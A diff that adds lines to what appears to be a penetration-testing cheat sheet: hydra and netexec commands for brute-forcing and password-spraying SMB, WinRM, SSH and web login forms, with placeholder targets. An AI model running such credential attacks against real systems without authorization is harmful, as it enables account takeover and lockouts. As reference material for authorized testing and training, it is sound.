@@ -762,6 +762,7 @@ hydra <RHOST> -l <USERNAME> -P /PATH/TO/WORDLIST <PROTOCOL>
 hydra <RHOST> -L users.txt -P passwords.txt <PROTOCOL>
 hydra <RHOST> -l <USERNAME> -P /PATH/TO/WORDLIST http-post-form "/admin.php:username=^USER^&password=^PASS^:login_error"
 hydra <RHOST> -l <USERNAME> -P /PATH/TO/WORDLIST http-post-form "/index.php:username=user&password=^PASS^:Login failed"
+hydra -L users.txt -p <PASSWORD> -m workgroup:{<DOMAIN>} <RHOST> smb2
 ```
 
 #### fcrack (ZIP)
@@ -1287,6 +1288,10 @@ netexec ldap <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --bloodhound -ns <RHOST> -c
 
 # WinRM
 netexec winrm <RHOST> -u '<USERNAME>' -p '<PASSWORD>' -d .
+netexec winrm <RHOST> -d <DOMAIN> -u users -p passwords --continue-on-success             # Password spray
+
+# SSH
+nxc ssh <RHOSTS> -u userfile -p passwordfile --no-bruteforce
 ```
 
 #### Evil-WinRM
